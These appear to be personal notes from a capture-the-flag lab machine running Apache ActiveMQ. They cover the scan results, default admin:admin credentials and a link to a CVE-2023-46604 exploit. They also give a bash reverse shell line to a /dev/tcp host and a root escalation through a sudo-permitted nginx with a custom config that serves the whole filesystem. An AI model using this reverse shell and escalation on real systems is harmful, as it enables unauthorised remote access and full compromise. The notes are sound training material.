| HOST | PORT | PROTO | SERVICE | VERSION
| 10.10.11.243 | 22 | tcp | OpenSSH | 8.9p1 Ubuntu 3ubuntu0.4 | 
| 10.10.11.243 | 80 | tcp | nginx | 1.18.0 | 


## HEADERS
---
HTTP/1.1 401 Unauthorized
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 10 Nov 2023 12:54:50 GMT
Content-Type: text/html;charset=iso-8859-1
Content-Length: 447
Connection: keep-alive
WWW-Authenticate: basic realm="ActiveMQRealm"
Cache-Control: must-revalidate,no-cache,no-store
---

## DIRECTORIES
---

---

## USERS
---
[/] admin:admin
activemq
root

---

## NOTES
---
basic http auth on /
Jetty 9.4.39
admin:admin to login
activemq message broker v5.15.15 (java based)
Exploit - https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ
Change poc-linux.xml to do `bash -c bash -i &gt;&amp; /dev/tcp/10.10.14.5/9001 0&gt;&amp;1` (html encoded)
cat ~/user.txt (user flag)
sudo -l (ALL : ALL) NOPASSWD: /usr/sbin/nginx
cp /etc/nginx/nginx.conf /dev/shm/
```
user root;
worker_processes auto;
pid /run/nginx.pid2;
include /etc/nginx/modules-enabled/*.conf;

events {
        worker_connections 768;
}

http {
        server {
                listen 1337;
                location / {
                        root /;
                        autoindex on;
                        }
                }
}
```
sudo nginx -c /dev/shm/nginx.conf
curl localhost:1337/root/root.txt (root flag)

---
